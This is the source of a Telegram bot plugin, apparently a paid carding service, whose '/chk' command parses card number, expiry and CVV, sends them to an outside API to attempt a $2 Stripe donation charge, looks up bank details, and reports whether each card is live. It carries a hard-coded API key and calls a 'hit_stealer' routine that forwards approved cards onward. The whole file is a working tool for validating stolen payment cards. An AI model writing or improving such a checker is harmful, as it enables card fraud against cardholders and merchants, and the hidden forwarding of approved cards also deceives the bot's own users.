from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
import requests, re, time, json
from plugins.func.users_sql import *
from plugins.tools.hit_stealer import send_hit_if_approved  # Hit forwarder
from datetime import date

session = requests.Session()

@Client.on_message(filters.command("chk", prefixes=["/", "."]))
async def cmd_chk(client, message):
    try:
        user_id = str(message.from_user.id)
        username = message.from_user.username or "None"
        chat_id = message.chat.id
        chat_type = str(message.chat.type)

        regdata = fetchinfo(user_id)
        if not regdata:
            insert_reg_data(user_id, username, 0, str(date.today()))
            regdata = fetchinfo(user_id)

        status = regdata[2] or "FREE"
        role = status
        credit = int(regdata[5] or 0)
        wait_time = int(regdata[6] or (15 if role == "FREE" else 5))
        antispam_time = int(regdata[7] or 0)
        now = int(time.time())

        GROUP = open("plugins/group.txt").read().splitlines()
        if chat_type == "ChatType.PRIVATE" and role == "FREE":
            return await message.reply(
                "Premium Users Required ⚠️\nOnly Premium Users can use this command in PM.\nJoin group for free use.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("Join Group", url="https://t.me/+Rl9oTRlGfbIwZDhk")]
                ]),
                disable_web_page_preview=True
            )

        if chat_type in ["ChatType.GROUP", "ChatType.SUPERGROUP"] and str(chat_id) not in GROUP:
            return await message.reply("❌ Unauthorized group. Contact admin.")

        if credit < 1:
            return await message.reply("❌ Insufficient credit. Use /buy to recharge.")

        if now - antispam_time < wait_time:
            return await message.reply(f"⏳ AntiSpam: wait {wait_time - (now - antispam_time)}s")

        cc = message.reply_to_message.text if message.reply_to_message else message.text.replace('/chk', '').strip()
        match = re.search(r'(\d{12,16})[|:\s,-](\d{1,2})[|:\s,-](\d{2,4})[|:\s,-](\d{3,4})', cc)
        if not match:
            return await message.reply("❌ Invalid format. Use cc|mm|yy|cvv")

        ccnum, mes, ano, cvv = match.groups()
        fullcc = f"{ccnum}|{mes}|{ano}|{cvv}"

        check_msg = await message.reply(
            f"┏━━━━━━━⍟\n"
            f"┃  Stripe 2$ Charge\n"
            f"┗━━━━━━━━━━━⊛\n"
            f"⊙ CC: {fullcc}\n"
            f"⊙ Status: Checking...\n"
            f"⊙ Response: Waiting for Response..."
        )

        tic = time.perf_counter()
        r = session.get(
            f"http://api.netherex.com/stripe_donation?api_key=SHORIEN-SH3D-DN3N-SBJE&cc={fullcc}",
            headers={"User-Agent": "Mozilla/5.0", "Accept": "application/json"},
            timeout=25
        )

        try:
            data = r.json()
            card_status = data.get("status", "").lower()
            card_message = "No message"

            if isinstance(data.get("message"), str):
                raw_level_1 = data["message"]
                try:
                    level1 = json.loads(raw_level_1)
                    error_raw = level1.get("errors")
                    if isinstance(error_raw, str):
                        card_message = error_raw
                except:
                    card_message = raw_level_1

                if "Stripe Error:" in card_message:
                    card_message = card_message.replace("Stripe Error:", "").strip()
        except:
            card_status = "error"
            card_message = "Invalid response or server error"

        toc = time.perf_counter()

        # BIN lookup using VoidEx API
        try:
            bininfo = session.get(f"https://api.voidex.dev/api/bin?bin={ccnum[:6]}", timeout=10).json()
            brand = bininfo.get("vendor")
            type_ = bininfo.get("type")
            level = bininfo.get("level")
            bank = bininfo.get("bank")
            country = bininfo.get("country_name")
            flag = bininfo.get("country_flag")
        except:
            brand = type_ = level = bank = country = flag = None

        brand, type_, level, bank, country = [str(x or "N/A").upper() for x in [brand, type_, level, bank, country]]
        flag = flag or ""

        status = "Approved ✅" if card_status == "success" else "Declined ❌"

        msg = f"""
<code>┏━━━━━━━⍟</code>
<b>┃  Stripe 2$ Charge</b>
<code>┗━━━━━━━━━━━⊛</code>
<b>⊙ CC:</b> <code>{fullcc}</code>
<b>⊙ Status:</b> {status}
<b>⊙ Response:</b> {card_message}
<b>⊙ Bank:</b> {bank}
<b>⊚ Bin type:</b> {brand} - {type_} - {level}
<b>⊙ Country:</b> {country} {flag}
<b>⊙ Time:</b> {toc - tic:.2f}s
<b>❛ ━━━━・⌁ 𝑩𝑨𝑹𝑹𝒀 ⌁・━━━━ ❜</b>
"""

        await send_hit_if_approved(client, msg)

        try:
            await client.edit_message_text(chat_id, check_msg.id, msg)
        except Exception as e:
            if "MESSAGE_NOT_MODIFIED" not in str(e):
                await message.reply_text(f"❌ Error: {str(e)}")

        updatedata(user_id, "credits", credit - 1)
        updatedata(user_id, "antispam_time", now)
        plan_expirychk(user_id)
    except Exception as e:
        await message.reply(f"❌ Error: {str(e)}")
